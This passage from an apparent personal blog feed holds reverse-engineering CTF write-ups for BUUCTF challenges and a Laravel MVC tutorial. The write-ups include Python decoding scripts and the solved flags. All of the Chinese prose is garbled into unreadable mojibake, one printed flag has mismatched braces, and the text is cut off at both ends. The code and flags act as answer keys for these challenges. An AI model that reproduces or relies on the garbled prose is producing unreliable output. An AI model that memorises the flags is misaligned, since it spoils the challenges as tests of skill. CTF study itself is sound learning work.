class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>å‘ç°æ˜¯ä¸ªé™æ€ç¼–è¯‘çš„mipsæ–‡ä»¶ï¼Œé‡Œé¢è¿˜æœ‰ä¸€ä»½output.txtæ–‡ä»¶<br>æ”¾åˆ°ubuntu20.04é‡Œï¼Œä¸‹ä¸ªqemu-useræ¥è·‘ä¸€ä¸‹ï¼Œè¾“å…¥ä¹‹åå°±é€€å‡ºäº†</p><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç®—æ³•ï¼Œæ ¹æ®ç‰¹å¾è¯†åˆ«ä¸ºbase64æ¢è¡¨<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>è¿™é‡Œè¿˜æœ‰padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 æ¢è¡¨è§£å¯†å³å¯</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravelæ¡†æ¶å­¦ä¹ </title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"><a href="#äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹" class="headerlink" title="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"></a>äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹</h2><ul><li>ä½¿ç”¨æ¡†æ¶æ¥å®ç°ä¸€ä¸ªé€šè¿‡urlè®¿é—®ç”¨æˆ·é‚®ç®±çš„å°åŠŸèƒ½æ¥äº†è§£è·¯ç”±ï¼Œæ¨¡å‹å’Œè§†å›¾çš„å†™æ³•</li></ul><p>é¦–å…ˆåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸¤æ¡æ•°æ®<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>ä½¿ç”¨php artisanç”Ÿæˆæ¨¡å‹<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>é€šè¿‡æ–‡æ¡£å¾—çŸ¥å‘½åè§„èŒƒå¦‚ä¸‹</p><blockquote><p>æ•°æ®è¡¨åç§°<br>è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å‘Šè¯‰ Eloquent æˆ‘ä»¬çš„ Flight æ¨¡å‹ä½¿ç”¨å“ªä¸ªæ•°æ®è¡¨ã€‚ é™¤éæ˜ç¡®åœ°æŒ‡å®šäº†å…¶å®ƒåç§°ï¼Œå¦åˆ™å°†ä½¿ç”¨ç±»çš„å¤æ•°å½¢å¼ã€Œè›‡å½¢å‘½åã€æ¥ä½œä¸ºè¡¨åã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒEloquent å°†å‡è®¾ Flight æ¨¡å‹å­˜å‚¨çš„æ˜¯ flights æ•°æ®è¡¨ä¸­çš„æ•°æ®ï¼Œè€Œ AirTrafficController æ¨¡å‹ä¼šå°†è®°å½•å­˜å‚¨åœ¨ air_traffic_controllers è¡¨ä¸­ã€‚<br>ä½ å¯ä»¥é€šè¿‡åœ¨æ¨¡å‹ä¸Šå®šä¹‰ table å±æ€§æ¥æŒ‡å®šè‡ªå®šä¹‰æ•°æ®è¡¨ï¼š<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¸æ¨¡å‹å…³è”çš„è¡¨å</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ•°æ®è¡¨ä¸ºusertests,æ¨¡å‹ä¸ºUsertest</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒEloquent é¢„æœŸä½ çš„æ•°æ®è¡¨ä¸­å­˜åœ¨ created_at å’Œ updated_at ä¸¤ä¸ªå­—æ®µ ã€‚å¦‚æœä½ ä¸æƒ³è®© Eloquent è‡ªåŠ¨ç®¡ç†è¿™ä¸¤ä¸ªåˆ—ï¼Œ è¯·å°†æ¨¡å‹ä¸­çš„ $timestamps å±æ€§è®¾ç½®ä¸º falseï¼š</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ˜¯å¦ä¸»åŠ¨ç»´æŠ¤æ—¶é—´æˆ³</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-phpæ¨¡å‹ä»£ç "><a href="#Usertest-phpæ¨¡å‹ä»£ç " class="headerlink" title="Usertest.phpæ¨¡å‹ä»£ç "></a>Usertest.phpæ¨¡å‹ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-phpæ§åˆ¶å™¨ä»£ç "><a href="#PostTestController-phpæ§åˆ¶å™¨ä»£ç " class="headerlink" title="PostTestController.phpæ§åˆ¶å™¨ä»£ç "></a>PostTestController.phpæ§åˆ¶å™¨ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// ddè°ƒè¯•phpç¨‹åº</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä¿®æ”¹äº†alexç”¨æˆ·çš„email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// returnè§†å›¾</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-phpè·¯ç”±ä»£ç "><a href="#web-phpè·¯ç”±ä»£ç " class="headerlink" title="web.phpè·¯ç”±ä»£ç "></a>web.phpè·¯ç”±ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-phpè§†å›¾ä»£ç "><a href="#posttest-blade-phpè§†å›¾ä»£ç " class="headerlink" title="posttest.blade.phpè§†å›¾ä»£ç "></a>posttest.blade.phpè§†å›¾ä»£ç </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> å¼€å‘å­¦ä¹  </tag>
            
            <tag> å¼€å‘æ¡†æ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverseé¢˜è§£1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elfæ–‡ä»¶ï¼Œ64ä½ï¼Œç›®æµ‹æ˜¯è¾“å…¥ä»€ä¹ˆlucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>ä¸ç®¡ä»–ï¼Œç›´æ¥ida f5å¤§æ³•<br>ä¸»è¦çš„å‡½æ•°å°±æ˜¯getflagè¿™ä¸ªå‡½æ•°<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>è®¾ç½®äº†éšæœºæ•°ï¼Œç„¶åswitchï¼Œæœ¬åœ°æµ‹è¯•åŸºæœ¬ä¸å¯èƒ½èµ°1-5åˆ†æ”¯<br>ç›®æµ‹ä¸€ä¸‹ï¼Œæ¯”è¾ƒåˆç†çš„æµç¨‹å°±æ˜¯451<br>4ä¸ºf2èµ‹å€¼<br>5æ”¹f2çš„å€¼<br>1æ‹¼æ¥f1å’Œf2<br>å…¶ä¸­f1åœ¨dataæ®µï¼Œæœ‰å­—ç¬¦ä¸²æ•°æ®ï¼Œf2åœ¨bssæœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µ<br>ç„¶åå°±èµ°è¿™ä¸ªæµç¨‹ï¼Œä¸€å¼€å§‹è„‘å­æŠ½äº†ï¼ŒæŒ‡é’ˆé‚£ä¸ªåœ°æ–¹è¯»é”™äº†ç„¶åå°±æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°<br>ç»“åˆæ±‡ç¼–æ¥è¯»ï¼Œå±€éƒ¨å˜é‡så…¶å®ä¸æ˜¯ä¸€ä¸ªlong longç±»å‹çš„æ•°æ®è€Œæ˜¯ä¸€ä¸ªå­—ç¬¦æ•°ç»„</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>ç„¶åæœ¬åœ°å†™ä¸ªè„šæœ¬ä¸€è¿è¡Œå°±å‡ºæ¥äº†<br>é™„ä¸Šæœ¬åœ°è°ƒè¯•çš„pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flagï¼Œä½†æ˜¯æ˜¯GXYå‰ç¼€ï¼Œæ¢ä¸Šctfå‰ç¼€äº¤ä¸Šæ‰å¯¹<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>ç­¾åˆ°é¢˜</p><p>æ„Ÿè§‰åƒä¸ªwin32çš„å°ç¨‹åº<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>æœå­—ç¬¦ä¸²å¤§æ³•<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>å‘ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>äº¤ä¸Šå°±å¯¹äº†555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>ä¸‹è½½ä¸‹æ¥å‘ç°æ˜¯htmlæ–‡ä»¶<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å‘ç°ä¸€æ®µjsä»£ç <br>åˆ†æå‘ç°æ ¸å¿ƒé€»è¾‘ä¸»è¦æ˜¯è¿™ä¸€å¥ï¼Œåªè¦æ˜¯å­—æ¯å°±è¢«æ­£åˆ™åŒ¹é…åˆ°ï¼Œç„¶åæ‰§è¡Œä¸‹é¢è¿™ä¸ª<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>å¤§æ¦‚å°±æ˜¯åˆ¤æ–­å­—ç¬¦æ˜¯å¦å°äºZï¼Œå¦‚æœæ˜¯ç¬¬ä¸€ä¸ªæ‹¬å·çš„å€¼å°±å˜æˆZå¦åˆ™å˜æˆz(æ³¨æ„æ­¤æ—¶cçš„å€¼æ²¡æœ‰å‘ç”Ÿæ”¹å˜)ï¼Œç„¶åç¬¬äºŒä¸ªå°æ‹¬å·æ˜¯å°†cæœ¬èº«+13(æ³¨æ„æ­¤æ—¶cçš„å€¼å·²ç»å‘ç”Ÿäº†æ”¹å˜)<br>å†åˆ¤æ–­ä¸¤ä¸ªå€¼çš„å¤§å°å…³ç³»ï¼Œå¦‚æœå‰è€…å¤§å°±ä¸æ”¹å˜ï¼Œå¦‚æœåè€…å¤§å°±-26(å³ç›¸å½“äº+13å-26ï¼Œæœ¬è´¨æ˜¯åŸæœ¬çš„å­—ç¬¦-13)<br>å­—æ¯ä¸€å…±26ä¸ªï¼Œå¦‚æœæœ¬èº«å˜æˆzåå¤§äºæœ¬èº«+13ï¼Œé‚£ä¹ˆå­—æ¯ä¸€å®šä¼šå°äºn</p><p>æœ‰äº†è¿™ä¸ªé€»è¾‘å†™è§£å¯†è„šæœ¬å°±å¯ä»¥äº†ï¼Œéå†åŠ å¯†åçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå½“å‰å­—ç¬¦å±äºa-mï¼Œé‚£ä¹ˆ+13ï¼Œå¦‚æœå±äºn-zï¼Œé‚£ä¹ˆ-13å³å¯<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpæ‰å‘ç°è¿™æ˜¯ä¸€ç§åŠ å¯†ä¸ºROT13åŠ å¯†ï¼Œå­¦åˆ°äº†</p><blockquote><p>å¥—ç”¨ROT13åˆ°ä¸€æ®µæ–‡å­—ä¸Šä»…ä»…åªéœ€è¦æ£€æŸ¥å­—å…ƒå­—æ¯é¡ºåºå¹¶å–ä»£å®ƒåœ¨13ä½ä¹‹åçš„å¯¹åº”å­—æ¯ï¼Œæœ‰éœ€è¦è¶…è¿‡æ—¶åˆ™é‡æ–°ç»•å›26è‹±æ–‡å­—æ¯å¼€ å¤´å³å¯ã€‚Aæ¢æˆNã€Bæ¢æˆOã€ä¾æ­¤ç±»æ¨åˆ°Mæ¢æˆZï¼Œç„¶ååºåˆ—åè½¬ï¼šNæ¢æˆAã€Oæ¢æˆBã€æœ€åZæ¢æˆMã€‚åªæœ‰è¿™äº›å‡ºç°åœ¨è‹±æ–‡å­—æ¯é‡Œå¤´çš„å­—å…ƒå—å½±å“ï¼›æ•°å­—ã€ç¬¦ å·ã€ç©ºç™½å­—å…ƒä»¥åŠæ‰€æœ‰å…¶ä»–å­—å…ƒéƒ½ä¸å˜ã€‚å› ä¸ºåªæœ‰åœ¨è‹±æ–‡å­—æ¯è¡¨é‡Œå¤´åªæœ‰26ä¸ªï¼Œå¹¶ä¸”26=2Ã—13ï¼ŒROT13å‡½æ•°æ˜¯å®ƒè‡ªå·±çš„é€†åï¼š [1] </p></blockquote><p>å¯¹ä»»ä½•å­—å…ƒxï¼šROT13(ROT13(x))=ROT26(x)=xã€‚<br>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿è§£å¯†å·¥å…·æ¢­å‡ºæ¥ä¹Ÿå¯ä»¥</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>æ˜¯ä¸ªELFæ–‡ä»¶ï¼Œå…ˆchecksecä¸€ä¸‹<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>å‘ç°å­˜åœ¨UPXå£³<br>ç›´æ¥ç”¨å·¥å…·è„±å£³<br><code>./upx -d ./re</code><br>ç„¶åè¿›å…¥idaåˆ†æï¼Œæ ¸å¿ƒé€»è¾‘å¾ˆç®€å•ï¼Œæ±‚å‡ºæ¯ä¸€ä½flagç„¶åè½¬æ¢æˆå­—ç¬¦å°±å¯ä»¥ï¼Œä½†æ˜¯æœ‰å‘ç‚¹<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>ä¸€å¼€å§‹æ˜¯æƒ³é€æ­¥æ±‚è§£çš„ï¼Œä½†æ˜¯å‘ç°è¿™ä¹Ÿå¤ªåäººç±»äº†ï¼Œç›´æ¥ç”¨æ­£åˆ™æå–å§<br>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span 